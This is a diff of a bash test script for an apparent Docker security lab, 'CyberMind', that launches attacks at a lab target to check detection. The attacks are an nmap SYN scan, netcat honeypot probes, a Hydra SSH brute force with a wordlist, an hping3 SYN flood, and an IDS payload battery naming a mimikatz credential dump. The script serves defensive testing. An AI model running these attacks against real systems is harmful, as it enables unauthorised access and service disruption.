@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ══════════════════════════════════════════════════════════════════════════════
-# CyberMind Sandbox — Full Attack + Detection Suite
+# CyberMind Sandbox — Full Attack + Detection Suite (OPTIMIZED)
 # Runs INSIDE the attacker container against flask on the lab network.
 # ══════════════════════════════════════════════════════════════════════════════
 set -uo pipefail
@@ -16,13 +16,12 @@ LOG="$RESULTS_DIR/sandbox_run_${TS}.log"
 mkdir -p "$WORKDIR"
 exec > >(tee -a "$LOG") 2>&1
 
-RED='\033[0;31m';GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-CYAN='\033[0;36m'
+RED='\033[0;31m'; GREEN='\033[0;32m'
+YELLOW='\033[1;33m'; CYAN='\033[0;36m'
 NC='\033[0m'
 
 echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${RED}║  CyberMind Docker Sandbox — Full Attack Suite                ║${NC}"
+echo -e "${RED}║  CyberMind Docker Sandbox — Full Attack Suite (Optimized)    ║${NC}"
 echo -e "${RED}║  Target: ${TARGET}                                           ║${NC}"
 echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
 echo ""
@@ -51,40 +50,39 @@ get_json() {
 }
 
 save() {
-  # save <name> <json-string>
   printf '%s\n' "$2" > "$WORKDIR/$1.json"
 }
 
 wait_for_api
 
 # ── 1. Start scan ────────────────────────────────────────────────────────────
-echo -e "${CYAN}[1] Starting live scan job...${NC}"
-SCAN_RESP=$(post_json "/scan/start" '{"packet_count":120}')
+echo -e "${CYAN}[1] Starting live scan job (500 packets)...${NC}"
+SCAN_RESP=$(post_json "/scan/start" '{"packet_count":500}')
 save scan_start "$SCAN_RESP"
 echo "$SCAN_RESP" | jq . 2>/dev/null || echo "$SCAN_RESP"
 JOB_ID=$(echo "$SCAN_RESP" | jq -r '.job_id // .data.job_id // empty' 2>/dev/null || true)
 echo "  job_id=${JOB_ID:-unknown}"
-sleep 2
+sleep 3
 
 # ── 2. Nmap ──────────────────────────────────────────────────────────────────
-echo -e "${CYAN}[2] ATTACK 1/6 — Nmap SYN port scan → ${TARGET}${NC}"
+echo -e "${CYAN}[2] ATTACK 1/5 — Nmap SYN port scan → ${TARGET}${NC}"
 nmap -sS -p 1-1000 --min-rate 300 "$TARGET" \
   -oN "$WORKDIR/nmap.txt" 2>&1 | tee "$WORKDIR/nmap_console.txt" || true
 echo -e "${GREEN}  ✔ Port scan complete${NC}"
-sleep 2
+sleep 4 # Pause allows scanner to capture this phase distinctly
 
 # ── 3. Honeypot probes ───────────────────────────────────────────────────────
-echo -e "${CYAN}[3] ATTACK 2/6 — Honeypot probes${NC}"
+echo -e "${CYAN}[3] ATTACK 2/5 — Honeypot probes${NC}"
 for p in 2222 2323 8080 3390 2121 3307; do
   echo "  probing ${TARGET}:${p}"
   printf 'GET / HTTP/1.0\r\nHost: cybermind-lab\r\n\r\n' \
     | nc -w 2 "$TARGET" "$p" > "$WORKDIR/honeypot_${p}.txt" 2>&1 || true
 done
 echo -e "${GREEN}  ✔ Honeypot probes complete${NC}"
-sleep 2
+sleep 4 # Pause allows scanner to capture this phase distinctly
 
 # ── 4. Hydra brute force ─────────────────────────────────────────────────────
-echo -e "${CYAN}[4] ATTACK 3/6 — Hydra SSH brute → ${TARGET}:2222${NC}"
+echo -e "${CYAN}[4] ATTACK 3/5 — Hydra SSH brute → ${TARGET}:2222${NC}"
 cat > /tmp/cm_wordlist.txt <<'EOF'
 root
 admin
@@ -99,17 +97,16 @@ hydra -l admin -P /tmp/cm_wordlist.txt "ssh://${TARGET}:2222" -t 4 -f \
   -o "$WORKDIR/hydra.txt" 2>&1 | tee "$WORKDIR/hydra_console.txt" || true
 rm -f /tmp/cm_wordlist.txt
 echo -e "${GREEN}  ✔ Brute force complete${NC}"
-sleep 2
+sleep 4 # Pause allows scanner to capture this phase distinctly
 
 # ── 5. SYN flood ─────────────────────────────────────────────────────────────
-echo -e "${CYAN}[5] ATTACK 4/6 — hping3 SYN flood → ${TARGET}:8080 (8s)${NC}"
-timeout 8 hping3 -S --flood -p 8080 "$TARGET" \
+echo -e "${CYAN}[5] ATTACK 4/5 — hping3 SYN flood → ${TARGET}:8080 (4s)${NC}"
+timeout 4 hping3 -S --flood -p 8080 "$TARGET" \
   > "$WORKDIR/hping3.txt" 2>&1 || true
 echo -e "${GREEN}  ✔ SYN flood complete${NC}"
-sleep 2
 
 # ── 6. IDS signature battery ─────────────────────────────────────────────────
-echo -e "${CYAN}[6] ATTACK 5/6 — IDS signature battery${NC}"
+echo -e "${CYAN}[6] ATTACK 5/5 — IDS signature battery${NC}"
 : > "$WORKDIR/ids_battery.ndjson"
 while IFS= read -r payload; do
   [ -z "$payload" ] && continue
@@ -133,24 +130,16 @@ mimikatz lsass credential dump
 PAYLOADS
 echo -e "${GREEN}  ✔ IDS battery complete${NC}"
 
-# ── 7. Demo attack-sim ───────────────────────────────────────────────────────
-echo -e "${CYAN}[7] ATTACK 6/6 — Demo attack-sim${NC}"
-SIM_RESP=$(post_json "/demo/attack-sim" \
-  '{"threat_type":"port_scan","tool":"nmap","target_port":8080,"payload":"sandbox nmap SYN","auto_block":false,"source_ip":"10.10.0.99"}')
-save demo_attack_sim "$SIM_RESP"
-echo "$SIM_RESP" | jq . 2>/dev/null || echo "$SIM_RESP"
-echo -e "${GREEN}  ✔ Attack-sim complete${NC}"
-
-# ── 8. Wait + collect ────────────────────────────────────────────────────────
-echo -e "${CYAN}[8] Waiting for scan classification...${NC}"
-sleep 8
+# ── 7. Wait + collect ────────────────────────────────────────────────────────
+echo -e "${CYAN}[7] Waiting for scan classification...${NC}"
+sleep 5
 if [[ -n "${JOB_ID:-}" ]]; then
   SCAN_STATUS=$(get_json "/scan/status/${JOB_ID}")
   save scan_status "$SCAN_STATUS"
   echo "$SCAN_STATUS" | jq . 2>/dev/null || echo "$SCAN_STATUS"
 fi
 
-echo -e "${CYAN}[9] Collecting CyberMind state...${NC}"
+echo -e "${CYAN}[8] Collecting CyberMind state...${NC}"
 save honeypot_status "$(get_json /honeypot/status)"
 save honeypot_logs "$(get_json /honeypot/logs)"
 save honeypot_summary "$(get_json /honeypot/summary)"
@@ -206,10 +195,8 @@ report = {
         "hydra_ssh_brute",
         "hping3_syn_flood",
         "ids_signature_battery",
-        "demo_attack_sim",
     ],
     "ids_battery": ids,
-    "demo_attack_sim": load("demo_attack_sim"),
     "cybermind_state": {
         "honeypot_status": load("honeypot_status"),
         "honeypot_logs": load("honeypot_logs"),
@@ -231,7 +218,6 @@ report = {
 Path(report_path).write_text(json.dumps(report, indent=2))
 print(f"Wrote {report_path}")
 
-# Pass / fail summary
 hp = report["cybermind_state"]["honeypot_logs"]
 ids_hits = sum(1 for i in ids if i.get("response"))
 print(f"IDS analyze calls: {ids_hits}")
